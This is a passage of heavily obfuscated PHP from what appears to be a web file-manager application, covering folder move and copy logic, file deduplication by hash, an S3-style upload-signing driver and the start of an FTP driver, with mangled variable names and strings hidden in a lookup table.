$_SERVER[èùÙ¹Ïö]; if (!isset($this->_childrenListCache[$¤ÊÉ¥ §])) { return; } $Ç¾¯Ÿä§ = $this->_childrenListCache[$¤ÊÉ¥ §]; foreach ($Ç¾¯Ÿä§ as $ë¹ãÁÂÁ => $ù²ÄíŠ) { $ñ£ó»ÀÔ[$ë¹ãÁÂÁ] = $ù²ÄíŠ; if ($ù²ÄíŠ[$ò°‰ıŠÄ[455]] == $ò°‰ıŠÄ[90]) { $this->_childrenListAll($ë¹ãÁÂÁ, $ñ£ó»ÀÔ); } } } private function sourceInfoCache($œˆœ÷½ì) { if (isset($this->_childrenItemCache[$œˆœ÷½ì])) { return $this->_childrenItemCache[$œˆœ÷½ì]; } return $this->sourceInfo($œˆœ÷½ì); } private function _childrenList($ Ù›ø„”) { if (isset($this->_childrenListCache[$ Ù›ø„”])) { return $this->_childrenListCache[$ Ù›ø„”]; } return $this->_childrenListSelect($ Ù›ø„”); } private function _childrenListSelect($òÒ­ôß) { $×î°“ò =& $_SERVER[èùÙ¹Ïö]; $É–ô·÷Ì = array($×î°“ò[182] => $òÒ­ôß, $×î°“ò[475] => $this->targetIsDelete); $İ€áø³Ä = $this->where($É–ô·÷Ì)->select(); $İ€áø³Ä = $İ€áø³Ä ? $İ€áø³Ä : array(); $†‚šÉò = array_to_keyvalue($İ€áø³Ä, $×î°“ò[183]); $this->_childrenListCache[$òÒ­ôß] = $†‚šÉò; foreach ($†‚šÉò as $òÒ­ôß => $áœÑ¯Êô) { $this->_childrenItemCache[$òÒ­ôß] = $áœÑ¯Êô; } return $†‚šÉò; } private function fileNameExistAuto($¿Û¦îØÕ, $«ı’òêÖ) { $¾§€Á­Ü =& $_SERVER[èùÙ¹Ïö]; if ($«ı’òêÖ[$¾§€Á­Ü[475]] == $¾§€Á­Ü[90]) { return $this->fileNameExist($¿Û¦îØÕ, $«ı’òêÖ[$¾§€Á­Ü[32]]); } return $this->fileNameExistCache($¿Û¦îØÕ, $«ı’òêÖ[$¾§€Á­Ü[32]]); } private function fileNameExistCache($Ìåªºªá, $ì÷³ÄÜÅ) { $šˆøŸÃ =& $_SERVER[èùÙ¹Ïö]; $ì÷³ÄÜÅ = strtolower($ì÷³ÄÜÅ); $Ô¥ÁãØû = $this->_childrenList($Ìåªºªá); foreach ($Ô¥ÁãØû as $ Ğ€ó) { if ($ì÷³ÄÜÅ == strtolower($ Ğ€ó[$šˆøŸÃ[32]])) { return $ Ğ€ó[$šˆøŸÃ[183]]; } } return !1; } private function fileNameAutoCache($–ƒ‰Ä¿Ş, $‚¦íÛ†, $âË¾“Çİ, $ª®Òàäó) { $õÚàñÁ™ =& $_SERVER[èùÙ¹Ïö]; $µËÊõà = $this->_childrenList($–ƒ‰Ä¿Ş); $ÔÚäô•“ = array_to_keyvalue($µËÊõà, $õÚàñÁ™[12], $õÚàñÁ™[32]); return $this->fileNameAutoGet($ÔÚäô•“, $‚¦íÛ†, $âË¾“Çİ, $ª®Òàäó); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Í†«»É, $íÙËæêº, $ººÄäá = REPEAT_REPLACE, $¸ßâ¦Œ = '') { $Ãªø¼Ìë =& $_SERVER[èùÙ¹Ïö]; $ıÕÂÑ = $this->sourceInfo($Í†«»É); $²ÊÅ«é³ = $this->sourceInfo($íÙËæêº); if ($ıÕÂÑ[$Ãªø¼Ìë[182]] == $²ÊÅ«é³[$Ãªø¼Ìë[183]]) { if ($ıÕÂÑ[$Ãªø¼Ìë[475]] == $Ãªø¼Ìë[90]) { Model($Ãªø¼Ìë[473])->restore(array($Í†«»É)); } if (!$¸ßâ¦Œ || $¸ßâ¦Œ == $ıÕÂÑ[$Ãªø¼Ìë[32]]) { return $Í†«»É; } } $ø±Ó³”  = $this->pathInfoMore($Í†«»É); if ($this->isParentOf($Í†«»É, $íÙËæêº)) { return !1; } if (!$ıÕÂÑ || !$²ÊÅ«é³ || $²ÊÅ«é³[$Ãªø¼Ìë[455]] != $Ãªø¼Ìë[90]) { return !1; } Hook::trigger($Ãªø¼Ìë[629], $ø±Ó³” ); $this->targetIsDelete = intval($ıÕÂÑ[$Ãªø¼Ìë[475]]); if ($ıÕÂÑ[$Ãªø¼Ìë[182]] == $íÙËæêº && $¸ßâ¦Œ != $ıÕÂÑ[$Ãªø¼Ìë[32]]) { $°§Ôø = $this->fileNameExist($íÙËæêº, $¸ßâ¦Œ); if ($°§Ôø && $ıÕÂÑ[$Ãªø¼Ìë[455]] == $Ãªø¼Ìë[214]) { $Í‘¡˜áƒ = $this->sourceInfo($°§Ôø); $ş»öÒÍó = $this->fileHistory($Í‘¡˜áƒ, $ıÕÂÑ[$Ãªø¼Ìë[511]], $ıÕÂÑ[$Ãªø¼Ìë[78]]); if (!$ş»öÒÍó) { Model($Ãªø¼Ìë[514])->remove($ıÕÂÑ[$Ãªø¼Ìë[511]]); } $this->removeNow($Í†«»É, !1); $this->folderSizeReset($íÙËæêº); Hook::trigger($Ãªø¼Ìë[630], $ø±Ó³” ); return $°§Ôø; } } $ïş‚©Áú = $¸ßâ¦Œ ? $¸ßâ¦Œ : $ıÕÂÑ[$Ãªø¼Ìë[32]]; $this->lockMoveStart($Í†«»É); $this->lockWriteStart($íÙËæêº, $ïş‚©Áú); $óóŞø’’ = array($Ãªø¼Ìë[600] => array(), $Ãªø¼Ìë[631] => !1); $this->clearShare($Í†«»É, $íÙËæêº); $Ùñ“ü… = $this->fileNameExistAuto($íÙËæêº, $ıÕÂÑ); $ù¨ÕÆ“› = $this->_move($Í†«»É, $íÙËæêº, $ººÄäá, $óóŞø’’, $¸ßâ¦Œ); $this->sourceCacheClear(); if ($ıÕÂÑ[$Ãªø¼Ìë[455]] == $Ãªø¼Ìë[90] && $Ùñ“ü…) { $this->folderSizeResetChildren($ù¨ÕÆ“›); } Model($Ãªø¼Ìë[216])->linkAdd($óóŞø’’[$Ãªø¼Ìë[600]]); if ($Ùñ“ü… && $óóŞø’’[$Ãªø¼Ìë[631]]) { $this->removeNow($Í†«»É, !1); } $this->lockMoveEnd($Í†«»É); $this->lockWriteEnd($íÙËæêº, $ïş‚©Áú); $this->folderSizeReset($ıÕÂÑ[$Ãªø¼Ìë[182]]); $this->folderSizeReset($íÙËæêº); $©©¯¤ë¾ = array($ıÕÂÑ[$Ãªø¼Ìë[182]], $íÙËæêº); if ($ıÕÂÑ[$Ãªø¼Ìë[455]] == $Ãªø¼Ìë[90]) { $©©¯¤ë¾[] = $Í†«»É; } $this->updateModifyTime($©©¯¤ë¾); Model($Ãªø¼Ìë[604])->eventMove($Í†«»É, $ıÕÂÑ[$Ãªø¼Ìë[182]], $íÙËæêº); Hook::trigger($Ãªø¼Ìë[630], $ø±Ó³” ); return $ù¨ÕÆ“›; } private function _move($˜àÍ”¼‘, $ ˜çêŒ, $ªõº‘áß, &$œÜŸ­‹¬, $–Ë¨±» = '') { $ëµûéÈ =& $_SERVER[èùÙ¹Ïö]; $‚Û±’›Ê = $this->sourceInfo($˜àÍ”¼‘); $òîã—¥¥ = $‚Û±’›Ê[$ëµûéÈ[455]] == $ëµûéÈ[90]; $—óÙÊ½Ğ = $–Ë¨±» ? $–Ë¨±» : $‚Û±’›Ê[$ëµûéÈ[32]]; $¼¬ÚõÇı = $this->fileNameExistAuto($ ˜çêŒ, $‚Û±’›Ê); $this->lockMoveStart($˜àÍ”¼‘); $this->lockWriteStart($ ˜çêŒ, $—óÙÊ½Ğ); if (!$¼¬ÚõÇı) { return $this->_moveForce($˜àÍ”¼‘, $ ˜çêŒ, $—óÙÊ½Ğ); } $Ôø¦õ•‰ = $¼¬ÚõÇı; $““‹€ˆ = !1; if ($òîã—¥¥) { if ($ªõº‘áß == REPEAT_RENAME_FOLDER) { $—óÙÊ½Ğ = $this->fileNameAuto($ ˜çêŒ, $—óÙÊ½Ğ, $ªõº‘áß, $òîã—¥¥); $Ôø¦õ•‰ = $this->_moveForce($˜àÍ”¼‘, $ ˜çêŒ, $—óÙÊ½Ğ); } else { if ($ªõº‘áß == REPEAT_RENAME_FOLDER) { $ªõº‘áß = REPEAT_RENAME; } $Í°©€İ§ = $this->_childrenListSelect($˜àÍ”¼‘); foreach ($Í°©€İ§ as $ó¨¦äÛ…) { $this->_move($ó¨¦äÛ…[$ëµûéÈ[183]], $¼¬ÚõÇı, $ªõº‘áß, $œÜŸ­‹¬); } $““‹€ˆ = !0; } } else { if ($ªõº‘áß == REPEAT_SKIP) { $““‹€ˆ = !0; } else { if ($ªõº‘áß == REPEAT_RENAME || $ªõº‘áß == REPEAT_RENAME_FOLDER) { $—óÙÊ½Ğ = $this->fileNameAuto($ ˜çêŒ, $—óÙÊ½Ğ, $ªõº‘áß, $òîã—¥¥); $Ôø¦õ•‰ = $this->_moveForce($˜àÍ”¼‘, $ ˜çêŒ, $—óÙÊ½Ğ); } else { if ($ªõº‘áß == REPEAT_REPLACE) { $òŸœ¶‹é = $this->sourceInfoCache($¼¬ÚõÇı); $›õûÏÜæ = $this->fileHistory($òŸœ¶‹é, $‚Û±’›Ê[$ëµûéÈ[511]], $‚Û±’›Ê[$ëµûéÈ[78]]); $““‹€ˆ = !0; if ($›õûÏÜæ) { $œÜŸ­‹¬[$ëµûéÈ[600]][] = $‚Û±’›Ê[$ëµûéÈ[511]]; } } } } } if ($““‹€ˆ && !$œÜŸ­‹¬[$ëµûéÈ[631]]) { $œÜŸ­‹¬[$ëµûéÈ[631]] = !0; } return $Ôø¦õ•‰; } private function _moveForce($´Ù¦¿ùù, $–ÏÁ§Ã, $‚›í”Ÿ©) { $Å¦µºÓ¸ =& $_SERVER[èùÙ¹Ïö]; $œ…ÌÕ¢« = $this->sourceInfo($´Ù¦¿ùù); $„¹«–§ø = $this->sourceInfo($–ÏÁ§Ã); $úšõ· = $œ…ÌÕ¢«[$Å¦µºÓ¸[455]] == $Å¦µºÓ¸[90]; $œÎí®¾¡ = array($Å¦µºÓ¸[447] => $„¹«–§ø[$Å¦µºÓ¸[183]], $Å¦µºÓ¸[623] => $„¹«–§ø[$Å¦µºÓ¸[556]] . $„¹«–§ø[$Å¦µºÓ¸[183]] . $Å¦µºÓ¸[50], $Å¦µºÓ¸[619] => $„¹«–§ø[$Å¦µºÓ¸[180]], $Å¦µºÓ¸[620] => $„¹«–§ø[$Å¦µºÓ¸[541]], $Å¦µºÓ¸[622] => USER_ID, $Å¦µºÓ¸[464] => $‚›í”Ÿ©); $Ö¯äŞÓÖ = $œ…ÌÕ¢«[$Å¦µºÓ¸[180]] == SourceModel::TYPE_GROUP && $„¹«–§ø[$Å¦µºÓ¸[180]] == SourceModel::TYPE_GROUP && $œ…ÌÕ¢«[$Å¦µºÓ¸[541]] == $„¹«–§ø[$Å¦µºÓ¸[541]]; if (!$Ö¯äŞÓÖ && $this->moveClearAuth) { Model($Å¦µºÓ¸[538])->authClear($´Ù¦¿ùù); } $ç÷Ò¦úî = $œ…ÌÕ¢«[$Å¦µºÓ¸[475]] == $Å¦µºÓ¸[90] && $„¹«–§ø[$Å¦µºÓ¸[475]] != $Å¦µºÓ¸[90]; if ($ç÷Ò¦úî) { $œÎí®¾¡[$Å¦µºÓ¸[474]] = 0; } if ($úšõ·) { $»³©ØÉÒ = array($Å¦µºÓ¸[623] => array($Å¦µºÓ¸[583], $œ…ÌÕ¢«[$Å¦µºÓ¸[556]] . $œ…ÌÕ¢«[$Å¦µºÓ¸[183]] . $Å¦µºÓ¸[584])); $È’òôå‚ = $œ…ÌÕ¢«[$Å¦µºÓ¸[556]] . $œ…ÌÕ¢«[$Å¦µºÓ¸[183]] . $Å¦µºÓ¸[50]; $í„¨î˜é = $„¹«–§ø[$Å¦µºÓ¸[556]] . $„¹«–§ø[$Å¦µºÓ¸[183]] . $Å¦µºÓ¸[50] . $œ…ÌÕ¢«[$Å¦µºÓ¸[183]] . $Å¦µºÓ¸[50]; $ÅúÍº¿ä = array($Å¦µºÓ¸[623] => array($Å¦µºÓ¸[632], "\x72\145\160\x6c\141\143\145\50\160\x61\162\145\x6e\x74\x4c\x65\166\x65\x6c\54\x27{$È’òôå‚}\47\x2c\x27{$í„¨î˜é}\x27\x29"), $Å¦µºÓ¸[619] => $„¹«–§ø[$Å¦µºÓ¸[180]], $Å¦µºÓ¸[620] => $„¹«–§ø[$Å¦µºÓ¸[541]]); if ($ç÷Ò¦úî) { $ÅúÍº¿ä[$Å¦µºÓ¸[474]] = 0; } $this->where($»³©ØÉÒ)->data($ÅúÍº¿ä)->save(); } $this->where(array($Å¦µºÓ¸[461] => $´Ù¦¿ùù))->data($œÎí®¾¡)->save(); return $´Ù¦¿ùù; } private function clearShare($³¯ö†Ã, $‰–Ö§«Ù) { $¶­İİöÕ =& $_SERVER[èùÙ¹Ïö]; $†¾‡–¶” = $this->sourceInfo($³¯ö†Ã); $ôÁ‰ïèó = $this->sourceInfo($‰–Ö§«Ù); if ($†¾‡–¶”[$¶­İİöÕ[541]] == $ôÁ‰ïèó[$¶­İİöÕ[541]] && $†¾‡–¶”[$¶­İİöÕ[180]] == $¶­İİöÕ[633]) { return; } $“Ì’€¤ö = array($¶­İİöÕ[556] => array($¶­İİöÕ[583], $†¾‡–¶”[$¶­İİöÕ[556]] . $³¯ö†Ã . $¶­İİöÕ[584])); $ÈÚÈƒ = $this->field($¶­İİöÕ[461])->where($“Ì’€¤ö)->getField($¶­İİöÕ[183], !0); if (!$ÈÚÈƒ) { return; } $“Ì’€¤ö = array($¶­İİöÕ[183] => array($¶­İİöÕ[7], $ÈÚÈƒ), $¶­İİöÕ[634] => 1); $¬á‰ŒºŒ = Model($¶­İİöÕ[635])->field($¶­İİöÕ[636])->where($“Ì’€¤ö)->select(); if (!$¬á‰ŒºŒ) { return; } $¬á‰ŒºŒ = array_to_keyvalue($¬á‰ŒºŒ, $¶­İİöÕ[12], $¶­İİöÕ[636]); $“Ì’€¤ö = array($¶­İİöÕ[636] => array($¶­İİöÕ[7], $¬á‰ŒºŒ)); Model($¶­İİöÕ[635])->where($“Ì’€¤ö)->save(array($¶­İİöÕ[634] => 0)); Model($¶­İİöÕ[637])->where($“Ì’€¤ö)->delete(); } public function copyFolderFromIO($Äº™”, $ÏıëÇı, $ï‹¥´üğ, $‘Ö÷ç¬, $«½¢ôÄÉ, $Ú©Š“¥ = false) { $ÂšÂˆËæ =& $_SERVER[èùÙ¹Ïö]; $¸®¨µÕÍ = array($ÂšÂˆËæ[601] => array(), $ÂšÂˆËæ[602] => array(), $ÂšÂˆËæ[600] => array(), $ÂšÂˆËæ[638] => array()); $™üÙ‹À = $Ú©Š“¥ ? $Ú©Š“¥ : $Äº™”->pathThis($ÏıëÇı); $˜óÜòòó = $this->fileNameExist($ï‹¥´üğ, $™üÙ‹À); $ÃÊ¸˜× = $this->mkdir($ï‹¥´üğ, $™üÙ‹À, $‘Ö÷ç¬); if (!$˜óÜòòó || $‘Ö÷ç¬ == REPEAT_RENAME_FOLDER) { $‘Ö÷ç¬ = !1; } if ($˜óÜòòó) { $this->_childrenAllMake($˜óÜòòó); } Hook::trigger($ÂšÂˆËæ[639]); $this->_copyChildTo($Äº™”, $ÏıëÇı, $ÃÊ¸˜×, $‘Ö÷ç¬, $¸®¨µÕÍ, $«½¢ôÄÉ); Hook::trigger($ÂšÂˆËæ[640]); if ($ÃÊ¸˜×) { $this->folderSizeResetChildren($ÃÊ¸˜×); } $this->_childrenListClear(); Model($ÂšÂˆËæ[603])->addAll($¸®¨µÕÍ[$ÂšÂˆËæ[601]], array(), !0); Model($ÂšÂˆËæ[604])->eventCopy($ÃÊ¸˜×); $this->saveAll($¸®¨µÕÍ[$ÂšÂˆËæ[602]]); Model($ÂšÂˆËæ[514])->linkAdd($¸®¨µÕÍ[$ÂšÂˆËæ[600]]); Model($ÂšÂˆËæ[514])->remove($¸®¨µÕÍ[$ÂšÂˆËæ[638]]); $this->folderSizeReset($ï‹¥´üğ); $this->updateModifyTime($ï‹¥´üğ); return $ÃÊ¸˜×; } private function _copyChildTo($ŠøøÉÏ½, $À¹öíúó, $½åöùï¨, $ŠÈÅ€ûá, &$¿ËôÒÉ, $Ç¹ú„æ¹) { $ÕˆÃ‘çÀ =& $_SERVER[èùÙ¹Ïö]; $Û ˜å¹Ô = $this->sourceInfoCache($½åöùï¨); $«˜Áì÷¶ = $ŠøøÉÏ½->listPath($À¹öíúó); $«˜Áì÷¶ = $«˜Áì÷¶ ? $«˜Áì÷¶ : array($ÕˆÃ‘çÀ[85] => array(), $ÕˆÃ‘çÀ[84] => array()); $ûß—¥ƒ› = array_merge($«˜Áì÷¶[$ÕˆÃ‘çÀ[85]], $«˜Áì÷¶[$ÕˆÃ‘çÀ[84]]); $çõ¾Ë’„ = $this->_addFiles($ŠøøÉÏ½, $«˜Áì÷¶[$ÕˆÃ‘çÀ[85]], $Ç¹ú„æ¹); $şÀ×êÅ¦ = array(); foreach ($ûß—¥ƒ› as &$şñ÷’Å) { if (isset($çõ¾Ë’„[$şñ÷’Å[$ÕˆÃ‘çÀ[32]]])) { $şñ÷’Å = $çõ¾Ë’„[$şñ÷’Å[$ÕˆÃ‘çÀ[32]]]; } $şñ÷’Å[$ÕˆÃ‘çÀ[455]] = $şñ÷’Å[$ÕˆÃ‘çÀ[33]] == $ÕˆÃ‘çÀ[77]; $şñ÷’Å[$ÕˆÃ‘çÀ[456]] = substr(_get($şñ÷’Å, $ÕˆÃ‘çÀ[177], $ÕˆÃ‘çÀ[12]), 0, 10); $şñ÷’Å[$ÕˆÃ‘çÀ[78]] = _get($şñ÷’Å, $ÕˆÃ‘çÀ[78], 0); $şñ÷’Å[$ÕˆÃ‘çÀ[511]] = _get($şñ÷’Å, $ÕˆÃ‘çÀ[511], 0); if (!isset($şñ÷’Å[$ÕˆÃ‘çÀ[641]]) && $şñ÷’Å[$ÕˆÃ‘çÀ[511]]) { $¿ËôÒÉ[$ÕˆÃ‘çÀ[638]][] = $şñ÷’Å[$ÕˆÃ‘çÀ[511]]; } if ($ŠÈÅ€ûá) { $³§µëí = $this->fileNameExistCache($½åöùï¨, $şñ÷’Å[$ÕˆÃ‘çÀ[32]]); if ($³§µëí) { if ($şñ÷’Å[$ÕˆÃ‘çÀ[455]] || $ŠÈÅ€ûá == REPEAT_SKIP) { continue; } if ($ŠÈÅ€ûá == REPEAT_REPLACE) { $úí×‰ôó = $this->sourceInfoCache($³§µëí); $÷Çœ†¸ = $this->fileHistory($úí×‰ôó, $şñ÷’Å[$ÕˆÃ‘çÀ[511]], $şñ÷’Å[$ÕˆÃ‘çÀ[78]]); if ($÷Çœ†¸) { $¿ËôÒÉ[$ÕˆÃ‘çÀ[600]][] = $şñ÷’Å[$ÕˆÃ‘çÀ[511]]; } continue; } else { if ($ŠÈÅ€ûá == REPEAT_RENAME) { $şñ÷’Å[$ÕˆÃ‘çÀ[32]] = $this->fileNameAutoCache($½åöùï¨, $şñ÷’Å[$ÕˆÃ‘çÀ[32]], $ŠÈÅ€ûá, !1); } } } } if (!$şñ÷’Å[$ÕˆÃ‘çÀ[455]] && $şñ÷’Å[$ÕˆÃ‘çÀ[511]] == 0) { continue; } if (!$şñ÷’Å[$ÕˆÃ‘çÀ[455]] && $şñ÷’Å[$ÕˆÃ‘çÀ[511]]) { $¿ËôÒÉ[$ÕˆÃ‘çÀ[600]][] = $şñ÷’Å[$ÕˆÃ‘çÀ[511]]; } $şÀ×êÅ¦[] = $this->_makeItemData($şñ÷’Å, $Û ˜å¹Ô, $şñ÷’Å[$ÕˆÃ‘çÀ[32]]); } unset($şñ÷’Å); if (!empty($şÀ×êÅ¦)) { $this->addAll($şÀ×êÅ¦); $this->_childrenListSelect($½åöùï¨); } $…Œèô Ã = $this->_childrenList($½åöùï¨); $…Œèô Ã = array_to_keyvalue($…Œèô Ã, $ÕˆÃ‘çÀ[32]); foreach ($ûß—¥ƒ› as $şñ÷’Å) { $úí×‰ôó = $…Œèô Ã[$şñ÷’Å[$ÕˆÃ‘çÀ[32]]]; $â»ª• = $úí×‰ôó[$ÕˆÃ‘çÀ[183]]; $this->_copyApplyMeta($úí×‰ôó, $¿ËôÒÉ); if ($şñ÷’Å[$ÕˆÃ‘çÀ[33]] == $ÕˆÃ‘çÀ[77]) { $şñ÷’Å[$ÕˆÃ‘çÀ[86]] = $ŠøøÉÏ½->getPathInner($şñ÷’Å[$ÕˆÃ‘çÀ[86]]); $this->_copyChildTo($ŠøøÉÏ½, $şñ÷’Å[$ÕˆÃ‘çÀ[86]], $â»ª•, $ŠÈÅ€ûá, $¿ËôÒÉ, $Ç¹ú„æ¹); } } } private function _addFiles($ßçş‘¯Ü, $»”ŸÑ´É, $ŞÄûÜæ•) { $İ‚ÂÉä™ =& $_SERVER[èùÙ¹Ïö]; if (!$»”ŸÑ´É || count($»”ŸÑ´É) == 0) { return array(); } $•“íŸõÓ = array(); foreach ($»”ŸÑ´É as &$Äñú¯òÖ) { Hook::trigger($İ‚ÂÉä™[642], $Äñú¯òÖ); $Äñú¯òÖ[$İ‚ÂÉä™[86]] = $ßçş‘¯Ü->getPathInner($Äñú¯òÖ[$İ‚ÂÉä™[86]]); $öşóßµ = $ßçş‘¯Ü->hashSimple($Äñú¯òÖ[$İ‚ÂÉä™[86]]); $ì˜ã£É˜ = $ßçş‘¯Ü->hashMd5($Äñú¯òÖ[$İ‚ÂÉä™[86]]); if (strlen($ì˜ã£É˜) > 10 && !isset($•“íŸõÓ[$ì˜ã£É˜])) { $•“íŸõÓ[$ì˜ã£É˜] = array(); } $Äñú¯òÖ[$İ‚ÂÉä™[643]] = $öşóßµ; $Äñú¯òÖ[$İ‚ÂÉä™[517]] = $ì˜ã£É˜; $•“íŸõÓ[$ì˜ã£É˜][] =& $Äñú¯òÖ; if (count($•“íŸõÓ[$ì˜ã£É˜]) > 1) { $Äñú¯òÖ[$İ‚ÂÉä™[641]] = !0; } Hook::trigger($İ‚ÂÉä™[644], $Äñú¯òÖ); } unset($Äñú¯òÖ); $ÄàŸ¥·İ = array($İ‚ÂÉä™[517] => array($İ‚ÂÉä™[7], array_keys($•“íŸõÓ))); $°ÂÕŠ– = Model($İ‚ÂÉä™[645]); $ª™şë…Ü = $°ÂÕŠ–->where($ÄàŸ¥·İ)->select(); $ª™şë…Ü = $ª™şë…Ü ? $ª™şë…Ü : array(); foreach ($ª™şë…Ü as $é–é¹·ñ) { if (!isset($•“íŸõÓ[$é–é¹·ñ[$İ‚ÂÉä™[517]]])) { continue; } $“ú¯ÕÑ´ = $•“íŸõÓ[$é–é¹·ñ[$İ‚ÂÉä™[517]]]; foreach ($“ú¯ÕÑ´ as &$Äñú¯òÖ) { $Äñú¯òÖ[$İ‚ÂÉä™[511]] = $é–é¹·ñ[$İ‚ÂÉä™[511]]; $Äñú¯òÖ[$İ‚ÂÉä™[641]] = !0; } unset($Äñú¯òÖ); } $¹ä¹ªº = array(); foreach ($»”ŸÑ´É as $ƒ×¢¶Æ) { Hook::trigger($İ‚ÂÉä™[646], $ƒ×¢¶Æ); if (isset($ƒ×¢¶Æ[$İ‚ÂÉä™[641]]) && $ƒ×¢¶Æ[$İ‚ÂÉä™[641]]) { Hook::trigger($İ‚ÂÉä™[647], $ƒ×¢¶Æ); continue; } $³ìÊÔö = $ßçş‘¯Ü->getPathInner($ƒ×¢¶Æ[$İ‚ÂÉä™[86]]); $¬ÌÈÔó = $°ÂÕŠ–->addFileMake($³ìÊÔö, $ƒ×¢¶Æ[$İ‚ÂÉä™[78]], $ƒ×¢¶Æ[$İ‚ÂÉä™[643]], $ƒ×¢¶Æ[$İ‚ÂÉä™[517]], $ƒ×¢¶Æ[$İ‚ÂÉä™[32]], $ŞÄûÜæ•); Hook::trigger($İ‚ÂÉä™[647], $ƒ×¢¶Æ); if (!is_array($¬ÌÈÔó)) { continue; } $¹ä¹ªº[] = $¬ÌÈÔó; } $°ÂÕŠ–->addAll($¹ä¹ªº); $ÄàŸ¥·İ = array($İ‚ÂÉä™[517] => array($İ‚ÂÉä™[7], array_keys($•“íŸõÓ))); $ª™şë…Ü = $°ÂÕŠ–->where($ÄàŸ¥·İ)->select(); $ª™şë…Ü = $ª™şë…Ü ? $ª™şë…Ü : array(); foreach ($ª™şë…Ü as $é–é¹·ñ) { if (!isset($•“íŸõÓ[$é–é¹·ñ[$İ‚ÂÉä™[517]]])) { continue; } $óõış¿ =& $•“íŸõÓ[$é–é¹·ñ[$İ‚ÂÉä™[517]]]; foreach ($óõış¿ as &$Äñú¯òÖ) { $Äñú¯òÖ[$İ‚ÂÉä™[511]] = $é–é¹·ñ[$İ‚ÂÉä™[511]]; } unset($Äñú¯òÖ); } $‘ØÎáê = array(); foreach ($»”ŸÑ´É as $–¾ÌİŠ) { $‘ØÎáê[$–¾ÌİŠ[$İ‚ÂÉä™[32]]] = $–¾ÌİŠ; } return $‘ØÎáê; } } goto f–ÎÎ„íîÊ; AÛóÇ ÅÕ™: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Û®š²Š) { parent::__construct($Û®š²Š); $this->signatureVersion($_SERVER[èùÙ¹Ïö][233]); } public function uploadFormData($˜±º…÷Ì, $¨Şçú¢† = 3600) { $¤¶ÌÇÀ =& $_SERVER[èùÙ¹Ïö]; $Ù©Ÿİë = $¤¶ÌÇÀ[215]; $è‹”¼”ğ = $¤¶ÌÇÀ[255]; $ÊğÖ´ãú = $¤¶ÌÇÀ[62]; $ÏÕ¥‹›Ë = gmdate($¤¶ÌÇÀ[256]); $ˆá»ú‹ = gmdate($¤¶ÌÇÀ[257]); $µÅØ­Å = $¤¶ÌÇÀ[258]; $¾Ï¬ãŸ = $¨Şçú¢† . $¤¶ÌÇÀ[12]; $®ŞÑûßç = $¤¶ÌÇÀ[259]; $®Úî‚ì» = array($this->accessKey, $ˆá»ú‹, $this->region, $ÊğÖ´ãú, $µÅØ­Å); $ï¸üãì¼ = implode($¤¶ÌÇÀ[8], $®Úî‚ì»); $¯…—ÎğÖ = array($¤¶ÌÇÀ[260] => gmdate($¤¶ÌÇÀ[1373], strtotime($¤¶ÌÇÀ[262])), $¤¶ÌÇÀ[263] => array(array($¤¶ÌÇÀ[264] => $this->bucket), array($¤¶ÌÇÀ[265] => $Ù©Ÿİë), array($¤¶ÌÇÀ[266], $¤¶ÌÇÀ[267], $¤¶ÌÇÀ[12]), array($¤¶ÌÇÀ[266], $¤¶ÌÇÀ[268], $¤¶ÌÇÀ[12]), array($¤¶ÌÇÀ[266], $¤¶ÌÇÀ[269], $¤¶ÌÇÀ[12]), array($¤¶ÌÇÀ[270] => $®ŞÑûßç), array($¤¶ÌÇÀ[271] => $ï¸üãì¼), array($¤¶ÌÇÀ[272] => $è‹”¼”ğ), array($¤¶ÌÇÀ[273] => $ÏÕ¥‹›Ë), array($¤¶ÌÇÀ[274] => $¾Ï¬ãŸ))); $­ÑÑÓüË = base64_encode(json_encode($¯…—ÎğÖ)); $É¸¾ËåÛ = hash_hmac($¤¶ÌÇÀ[275], $ˆá»ú‹, $¤¶ÌÇÀ[276] . $this->secret, !0); $ÑˆÎÄÆ = hash_hmac($¤¶ÌÇÀ[275], $this->region, $É¸¾ËåÛ, !0); $¯ï …çˆ = hash_hmac($¤¶ÌÇÀ[275], $ÊğÖ´ãú, $ÑˆÎÄÆ, !0); $Şó®ó’› = hash_hmac($¤¶ÌÇÀ[275], $µÅØ­Å, $¯ï …çˆ, !0); $œ­ıÈ«‹ = hash_hmac($¤¶ÌÇÀ[275], $­ÑÑÓüË, $Şó®ó’›); $¡Œå„Şô = array($¤¶ÌÇÀ[232] => $¤¶ÌÇÀ[12], $¤¶ÌÇÀ[277] => $¤¶ÌÇÀ[12], $¤¶ÌÇÀ[265] => $Ù©Ÿİë, $¤¶ÌÇÀ[270] => $®ŞÑûßç, $¤¶ÌÇÀ[278] => $­ÑÑÓüË, $¤¶ÌÇÀ[279] => $ï¸üãì¼, $¤¶ÌÇÀ[280] => $è‹”¼”ğ, $¤¶ÌÇÀ[281] => $ÏÕ¥‹›Ë, $¤¶ÌÇÀ[282] => $¾Ï¬ãŸ, $¤¶ÌÇÀ[283] => $œ­ıÈ«‹, $¤¶ÌÇÀ[198] => $this->getHost()); return $¡Œå„Şô; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¶©Šù¬×) { parent::__construct(); if (count($¶©Šù¬×) > 0) { $this->_init($¶©Šù¬×); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ß é©‹) { $¹òšÁ =& $_SERVER[èùÙ¹Ïö]; global $config; $this->appCharset = $config[$¹òšÁ[1399]]; $this->systemCharset = $config[$¹òšÁ[1400]]; if (isset($ß é©‹[$¹òšÁ[1401]]) && $ß é©‹[$¹òšÁ[1401]]) { $this->systemCharset = $ß é©‹[$¹òšÁ[1401]]; } } public function iconvApp($ÅúÃ¢çÇ) { return $this->iconvTo($ÅúÃ¢çÇ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ÏÒÇäŒç) { return $this->iconvTo($ÏÒÇäŒç, $this->appCharset, $this->systemCharset); } public function getPathOuter($¦™š¼˜) { $®©²ğ™ =& $_SERVER[èùÙ¹Ïö]; $Œ­º“‰„ = $this->iconvApp($this->pathBase); $¦™š¼˜ = $this->iconvApp($¦™š¼˜); if (substr($Œ­º“‰„, 0, 2) == $®©²ğ™[1402]) { $Œ­º“‰„ = BASIC_PATH . substr($Œ­º“‰„, 2); } if (substr($¦™š¼˜, 0, 2) == $®©²ğ™[1402]) { $¦™š¼˜ = BASIC_PATH . substr($¦™š¼˜, 